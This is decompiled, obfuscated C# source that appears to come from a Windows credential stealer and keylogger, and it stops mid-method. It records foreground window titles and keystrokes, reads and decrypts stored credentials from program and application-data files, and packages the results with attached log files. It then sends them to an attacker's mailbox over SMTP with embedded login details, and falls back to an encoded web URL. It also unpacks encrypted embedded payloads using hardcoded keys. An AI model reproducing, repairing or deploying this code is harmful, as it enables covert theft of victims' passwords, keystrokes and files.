using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns1;
using ns2;
using ns3;
using ns4;
using ns5;

namespace ns6;

internal class Class16
{
	[DllImport("user32.dll", SetLastError = true)]
	static extern IntPtr GetForegroundWindow();

	static int smethod_0(Class23.Class26 class26_0)
	{
		return class26_0.int_1;
	}

	static Class12.Class13.Struct7[] smethod_1()
	{
		Class12.Class13.Struct7[] result = default(Class12.Class13.Struct7[]);
		try
		{
			string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class16.smethod_57("dXeus6WIol+MoYWZsqJ5iaSrq5RapK+ynTl1r7akgpeguqGIol+ZrYmkrrisdaSru6yCoG2rsH4u", "False");
			string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("mJjS2cehd6XYyKzM1s7NmKfUzsGhycfXvqHKvtTAtbrKysSqhdLVxK/LDA==", "False");
			string string_3 = null;
			if (!Class16.smethod_59(ref string_3, string_2, string_))
			{
				result = null;
				return result;
			}
			result = Class16.smethod_19(string_3.Remove(checked(string_3.Length - 2))).ToArray();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static ulong smethod_2(int int_0, int int_1)
	{
		if (int_1 > 8 || int_1 == 0)
		{
			return 0uL;
		}
		ulong num = 0uL;
		checked
		{
			int num2 = int_1 - 1;
			for (int i = 0; i <= num2; i++)
			{
				num = (num << 8) | Class8.byte_0[int_0 + i];
			}
			return num;
		}
	}

	static IntPtr smethod_3(IntPtr intptr_0)
	{
		IntPtr result = default(IntPtr);
		return result;
	}

	static int smethod_4(Class23.Stream0 stream0_0)
	{
		return Class16.smethod_13(stream0_0) | (Class16.smethod_13(stream0_0) << 16);
	}

	static int smethod_5(Class23.Class26 class26_0)
	{
		return 32768 - class26_0.int_1;
	}

	static int smethod_6(int int_0, int int_1, ref Class9.Struct5 struct5_0)
	{
		try
		{
			string text = Class16.smethod_46(Class16.GetForegroundWindow());
			if (Operators.CompareString(text, Class9.string_1, false) != 0)
			{
				Class9.string_1 = text;
				Class5.string_12 = Class5.string_12 + Environment.NewLine + Class16.smethod_57("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + Class16.smethod_57("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			string text2 = "";
			if (int_1 == 256 || int_1 == 260)
			{
				checked
				{
					switch (struct5_0.int_0)
					{
					case 8:
						Class5.string_12 = Class5.string_12.Substring(0, Class5.string_12.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class16.smethod_57("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class16.smethod_57("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = Class16.smethod_57("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = Class16.smethod_57("RyA=", "False");
						break;
					case 35:
						text2 = Class16.smethod_57("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = Class16.smethod_57("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = Class16.smethod_57("U6mVvXIT", "False");
						break;
					case 38:
						text2 = Class16.smethod_57("SJ6ssmce", "False");
						break;
					case 39:
						text2 = Class16.smethod_57("X7WjyX4H", "False");
						break;
					case 40:
						text2 = Class16.smethod_57("O5GXpVor", "False");
						break;
					case 46:
						text2 = Class16.smethod_57("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = Class16.smethod_57("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(Class16.smethod_57("VBM=", "False")) });
							switch (struct5_0.int_0)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(struct5_0.int_0);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(struct5_0.int_0 + 32).ToLower() : char.ConvertFromUtf32(struct5_0.int_0 + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = Class16.smethod_57("UaedGA==", "False") + Conversions.ToString(struct5_0.int_0 - 111) + Class16.smethod_57("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = Class16.smethod_57("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = Class16.smethod_57("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("cBI=", "False") : Class16.smethod_57("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("WSs=", "False") : Class16.smethod_57("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("YhE=", "False") : Class16.smethod_57("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("cAQ=", "False") : Class16.smethod_57("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("ZRA=", "False") : Class16.smethod_57("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("aQ0=", "False") : Class16.smethod_57("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("lBM=", "False") : Class16.smethod_57("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(struct5_0.int_0);
						break;
					case 219:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("mgg=", "False") : Class16.smethod_57("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("czA=", "False") : Class16.smethod_57("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("gSM=", "False") : Class16.smethod_57("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown()) ? Class16.smethod_57("bQE=", "False") : Class16.smethod_57("Ths=", "False"));
						break;
					}
					Class5.string_12 += text2;
					Class5.string_31 = Class5.string_12;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static bool smethod_7(Class23.Class24 class24_0)
	{
		switch (class24_0.int_4)
		{
		case 2:
		{
			if (class24_0.bool_0)
			{
				class24_0.int_4 = 12;
				return false;
			}
			int num = Class16.smethod_63(class24_0.class25_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class16.smethod_50(class24_0.class25_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class24_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class16.smethod_17(class24_0.class25_0);
				class24_0.int_4 = 3;
				break;
			case 1:
				class24_0.class27_0 = Class23.Class27.class27_0;
				class24_0.class27_1 = Class23.Class27.class27_1;
				class24_0.int_4 = 7;
				break;
			case 2:
				class24_0.class28_0 = new Class23.Class28();
				class24_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class24_0.int_8 = Class16.smethod_63(class24_0.class25_0, 16)) < 0)
			{
				return false;
			}
			Class16.smethod_50(class24_0.class25_0, 16);
			class24_0.int_4 = 4;
			goto case 4;
		case 4:
		{
			int num2 = Class16.smethod_63(class24_0.class25_0, 16);
			if (num2 < 0)
			{
				return false;
			}
			Class16.smethod_50(class24_0.class25_0, 16);
			class24_0.int_4 = 5;
			goto case 5;
		}
		case 5:
		{
			int num3 = Class16.smethod_41(class24_0.class26_0, class24_0.class25_0, class24_0.int_8);
			class24_0.int_8 -= num3;
			if (class24_0.int_8 == 0)
			{
				class24_0.int_4 = 2;
				return true;
			}
			return !Class16.smethod_26(class24_0.class25_0);
		}
		case 6:
			if (!Class16.smethod_24(class24_0.class28_0, class24_0.class25_0))
			{
				return false;
			}
			class24_0.class27_0 = Class16.smethod_16(class24_0.class28_0);
			class24_0.class27_1 = Class16.smethod_12(class24_0.class28_0);
			class24_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class16.smethod_9(class24_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static byte[] smethod_8(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class16.smethod_29(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class23.Stream0 stream = new Class23.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class16.smethod_4(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class16.smethod_13(stream);
			int num3 = Class16.smethod_13(stream);
			int num4 = Class16.smethod_13(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class16.smethod_4(stream);
			Class16.smethod_4(stream);
			Class16.smethod_4(stream);
			int num5 = Class16.smethod_4(stream);
			int num6 = Class16.smethod_13(stream);
			int num7 = Class16.smethod_13(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class23.Class24 class24_ = new Class23.Class24(array2);
			array = new byte[num5];
			Class16.smethod_54(0, class24_, array.Length, array);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class16.smethod_4(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class16.smethod_4(stream);
					num11 = Class16.smethod_4(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class23.Class24 class24_2 = new Class23.Class24(array3);
					Class16.smethod_54(i, class24_2, num11, array);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 124, 125, 255, 240, 43, 148, 172, 185 };
				byte[] byte_2 = new byte[8] { 16, 37, 246, 197, 82, 38, 96, 45 };
				using Class22 class22_ = new Class22();
				using ICryptoTransform cryptoTransform = Class16.smethod_32(byte_, class22_, bool_0: true, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class16.smethod_8(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class21 class21_ = new Class21();
				using ICryptoTransform cryptoTransform2 = Class16.smethod_27(byte_5, byte_4, class21_, bool_0: true);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class16.smethod_8(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static bool smethod_9(Class23.Class24 class24_0)
	{
		int num = Class16.smethod_5(class24_0.class26_0);
		while (num >= 258)
		{
			switch (class24_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class16.smethod_60(class24_0.class27_0, class24_0.class25_0)) & -256) == 0)
				{
					Class16.smethod_47(class24_0.class26_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class24_0.int_6 = Class23.Class24.int_0[num2 - 257];
					class24_0.int_5 = Class23.Class24.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class24_0.class27_1 = null;
				class24_0.class27_0 = null;
				class24_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class24_0.int_5 > 0)
				{
					class24_0.int_4 = 8;
					int num4 = Class16.smethod_63(class24_0.class25_0, class24_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class16.smethod_50(class24_0.class25_0, class24_0.int_5);
					class24_0.int_6 += num4;
				}
				class24_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class16.smethod_60(class24_0.class27_1, class24_0.class25_0);
				if (num2 >= 0)
				{
					class24_0.int_7 = Class23.Class24.int_2[num2];
					class24_0.int_5 = Class23.Class24.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class24_0.int_5 > 0)
				{
					class24_0.int_4 = 10;
					int num3 = Class16.smethod_63(class24_0.class25_0, class24_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class16.smethod_50(class24_0.class25_0, class24_0.int_5);
					class24_0.int_7 += num3;
				}
				Class16.smethod_35(class24_0.class26_0, class24_0.int_6, class24_0.int_7);
				num -= class24_0.int_6;
				class24_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static void smethod_10()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class16.smethod_57("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class16.smethod_57("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double double_ = 25.0;
			Class16.smethod_25(ref double_);
			string text = Class16.smethod_57("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + Class5.string_0 + Environment.NewLine + Environment.NewLine + Class5.string_1 + Environment.NewLine + Environment.NewLine + Class5.string_2 + Environment.NewLine + Environment.NewLine + Class5.string_3 + Environment.NewLine + Environment.NewLine + Class5.string_4 + Environment.NewLine + Environment.NewLine + Class5.string_5 + Environment.NewLine + Environment.NewLine + Class5.string_6 + Environment.NewLine + Environment.NewLine + Class5.string_7 + Environment.NewLine + Environment.NewLine + Class5.string_8 + Environment.NewLine + Environment.NewLine + Class5.string_9 + Environment.NewLine + Environment.NewLine + Class5.string_10 + Environment.NewLine + Environment.NewLine + Class5.string_11 + Environment.NewLine + Environment.NewLine + Class16.smethod_57("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(Class5.string_13);
				mailMessage2.To.Add(Class5.string_13);
				mailMessage2.Subject = Class16.smethod_57("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class16.smethod_57("aQ0=", Class16.smethod_57("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(Class5.string_15);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = Class5.int_0;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(Class5.string_13, Class5.string_14);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = Class16.smethod_57("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + Class5.string_13 + "&subject=" + Strings.Replace(Class16.smethod_57("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class16.smethod_57("aQ0=", Class16.smethod_57("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + Class5.string_13).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_11(Class23.Class25 class25_0)
	{
		return class25_0.int_1 - class25_0.int_0 + (class25_0.int_2 >> 3);
	}

	static Class23.Class27 smethod_12(Class23.Class28 class28_0)
	{
		byte[] array = new byte[class28_0.int_4];
		Array.Copy(class28_0.byte_1, class28_0.int_3, array, 0, class28_0.int_4);
		return new Class23.Class27(array);
	}

	static int smethod_13(Class23.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static bool smethod_14(long long_0)
	{
		return (long_0 & 1L) == 1L;
	}

	static string smethod_15(byte[] byte_0)
	{
		checked
		{
			string result = default(string);
			try
			{
				int num = 0;
				object obj = Marshal.AllocHGlobal(byte_0.Length + 4);
				IntPtr intPtr = default(IntPtr);
				Marshal.Copy(byte_0, 0, (obj != null) ? ((IntPtr)obj) : intPtr, byte_0.Length);
				object obj2 = Marshal.AllocHGlobal(Class12.Class13.byte_0.Length);
				Marshal.Copy(Class12.Class13.byte_0, 0, (obj2 != null) ? ((IntPtr)obj2) : intPtr, Class12.Class13.byte_0.Length);
				Class12.Class13.Struct6 struct6_ = default(Class12.Class13.Struct6);
				struct6_.int_0 = byte_0.Length;
				struct6_.intptr_0 = ((obj != null) ? ((IntPtr)obj) : intPtr);
				Class12.Class13.Struct6 struct6_2 = default(Class12.Class13.Struct6);
				struct6_2.int_0 = Class12.Class13.byte_0.Length;
				struct6_2.intptr_0 = ((obj2 != null) ? ((IntPtr)obj2) : intPtr);
				IntPtr zero = IntPtr.Zero;
				IntPtr intptr_ = IntPtr.Zero;
				IntPtr intptr_2 = zero;
				Class12.Class13.Struct6 struct6_3 = default(Class12.Class13.Struct6);
				if (!Class16.smethod_55(ref intptr_, intptr_2, ref struct6_2, 0, (string)null, ref struct6_3, ref struct6_))
				{
					result = null;
					return result;
				}
				Marshal.FreeHGlobal((obj != null) ? ((IntPtr)obj) : intPtr);
				Marshal.FreeHGlobal((obj2 != null) ? ((IntPtr)obj2) : intPtr);
				num = Marshal.ReadInt32(struct6_3.intptr_0);
				byte[] array = new byte[num + 1];
				ref IntPtr intptr_3 = ref struct6_3.intptr_0;
				intptr_3 = new IntPtr(struct6_3.intptr_0.ToInt32() + 4);
				Marshal.Copy(struct6_3.intptr_0, array, 0, num);
				Class16.smethod_3(struct6_3.intptr_0);
				char[] array2 = new char[num - 1 + 1];
				int num2 = num - 1;
				for (int i = 0; i <= num2; i++)
				{
					array2[i] = Strings.ChrW(unchecked((int)array[i]));
				}
				result = new string(array2);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static Class23.Class27 smethod_16(Class23.Class28 class28_0)
	{
		byte[] array = new byte[class28_0.int_3];
		Array.Copy(class28_0.byte_1, 0, array, 0, class28_0.int_3);
		return new Class23.Class27(array);
	}

	static void smethod_17(Class23.Class25 class25_0)
	{
		class25_0.uint_0 >>= class25_0.int_2 & 7;
		class25_0.int_2 &= -8;
	}

	static bool smethod_18(string string_0)
	{
		int num = -1;
		int num2 = Class8.struct4_0.Length;
		checked
		{
			for (int i = 0; i <= num2; i++)
			{
				if (Class8.struct4_0[i].string_1.ToLower().CompareTo(string_0.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = Class8.struct4_0[num].string_3.Substring(Class8.struct4_0[num].string_3.IndexOf("(") + 1).Split(new char[1] { ',' });
			int num3 = array.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				array[j] = Strings.LTrim(array[j]);
				object obj = array[j].IndexOf(" ");
				if (Operators.ConditionalCompareObjectGreater(obj, (object)0, false))
				{
					array[j] = array[j].Substring(0, Conversions.ToInteger(obj));
				}
				if (array[j].IndexOf(Class16.smethod_57("jaGntqx9Dw==", "False")) == 0)
				{
					break;
				}
				Class8.string_0 = (string[])Utils.CopyArray((Array)Class8.string_0, (Array)new string[j + 1]);
				Class8.string_0[j] = array[j];
			}
			return Class16.smethod_28((ulong)((Class8.struct4_0[num].long_1 - 1L) * unchecked((long)Class8.ushort_0)));
		}
	}

	static List<Class12.Class13.Struct7> smethod_19(string string_0)
	{
		string input = File.ReadAllText(string_0);
		List<Class12.Class13.Struct7> list = new List<Class12.Class13.Struct7>();
		checked
		{
			try
			{
				int num = Class12.Class13.smethod_0(ref Class12.Class13.string_0, Regex.Split(Regex.Split(input, Class16.smethod_57("Wpq2vZ6Xdyo=", "False"))[1], Class16.smethod_57("XaCwsbRfJg==", "False"))).Length - 1;
				for (int i = 1; i <= num; i++)
				{
					Class12.Class13.Struct7 item = default(Class12.Class13.Struct7);
					string string_ = Class12.Class13.string_0[i];
					string string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_0 = Class16.smethod_20(0, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("e8PT4MOmv9eqCw==", "False");
					string_3 = Class16.smethod_57("VmSpta1/nKW5dyw=", "False");
					item.int_1 = int.Parse(Class16.smethod_20(0, string_3, string_, string_2));
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_6 = Class16.smethod_20(1, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("fsHJ48KABQ==", "False");
					string_3 = Class16.smethod_57("coDAxMmXjxI=", "False");
					item.string_1 = Class16.smethod_20(0, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_3 = Class16.smethod_20(2, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_4 = Class16.smethod_20(3, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_5 = Class16.smethod_20(4, string_3, string_, string_2);
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("e8PT4MOmv9eqCw==", "False");
					string_3 = Class16.smethod_57("VmSpta1/nKW5dyw=", "False");
					item.int_2 = int.Parse(Class16.smethod_20(1, string_3, string_, string_2));
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("e8PT4MOmv9eqCw==", "False");
					string_3 = Class16.smethod_57("VmSpta1/nKW5dyw=", "False");
					item.int_0 = int.Parse(Class16.smethod_20(2, string_3, string_, string_2));
					string_ = Class12.Class13.string_0[i];
					string_2 = Class16.smethod_57("Y7XBxq+VqYsi", "False");
					string_3 = Class16.smethod_57("c4HQ2MigwMSiEw==", "False");
					item.string_7 = Class16.smethod_20(5, string_3, string_, string_2);
					item.int_3 = i - 1;
					item.string_2 = Class16.smethod_15(Convert.FromBase64String(item.string_1));
					list.Add(item);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return list;
		}
	}

	static string smethod_20(int int_0, string string_0, string string_1, string string_2)
	{
		string result = default(string);
		try
		{
			string input = Regex.Split(string_1, string_2)[checked(int_0 + 1)];
			result = Regex.Split(input, string_0)[0];
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static byte[] smethod_21(byte[] byte_0, byte[] byte_1)
	{
		checked
		{
			int num = byte_0[byte_0.Length - 1];
			byte[] array = new byte[byte_0.Length - 2 + 1];
			short num2 = 0;
			try
			{
				int num3 = byte_0.Length - 2;
				for (int i = 0; i <= num3; i++)
				{
					if (num2 >= byte_1.Length)
					{
						num2 = 0;
					}
					if (i < byte_0.Length - 1)
					{
						array[i] = Convert.ToByte(unchecked((int)byte_0[i]) - unchecked(array.Length % byte_1.Length) - unchecked((int)byte_1[num2]) + num);
						num2 = (short)(num2 + 1);
					}
				}
				return array;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = array;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static string smethod_22()
	{
		List<string> list = new List<string>();
		string text = Class16.smethod_52();
		checked
		{
			try
			{
				string text2 = text;
				int i = 0;
				for (int length = text2.Length; i < length; i++)
				{
					string text3 = Conversions.ToString(text2[i]);
					if (Operators.CompareString(text3, "", false) != 0)
					{
						list.Add(text3);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			StringBuilder stringBuilder = new StringBuilder();
			string result = default(string);
			try
			{
				string text4;
				if (list.Count == 0)
				{
					text4 = Class16.smethod_57("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + Class16.smethod_57("P4ezr65+WKizsIWdtWqfjK2vrlyLp7dqnoJYta+fjK6ovKGBZGO5rj2sq69ckquovFyBoadqqoysY7Kdk51jmayCqqRqpYurt6uoiZ2neC0=", "False") + Environment.NewLine + Class16.smethod_57("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False");
					return result;
				}
				int num = list.Count - 1;
				for (int j = 0; j <= num; j += 3)
				{
					stringBuilder.Append(Class16.smethod_57("jM7d5Z1kAw==", "False") + list[j].Substring(1)).AppendLine();
					stringBuilder.Append(Class16.smethod_57("kcrH23uKuM/OlVwL", "False") + list[j + 1].Substring(1)).AppendLine();
					stringBuilder.Append(Class16.smethod_57("j7vY39WuzMmmfgc=", "False") + list[j + 2].Substring(1)).AppendLine();
					stringBuilder.Append(Class16.smethod_57("YXyHjoBhfIeOgGF8h46AYXyHjoBhfIeOgGF8h46AYXwk", "False")).AppendLine();
				}
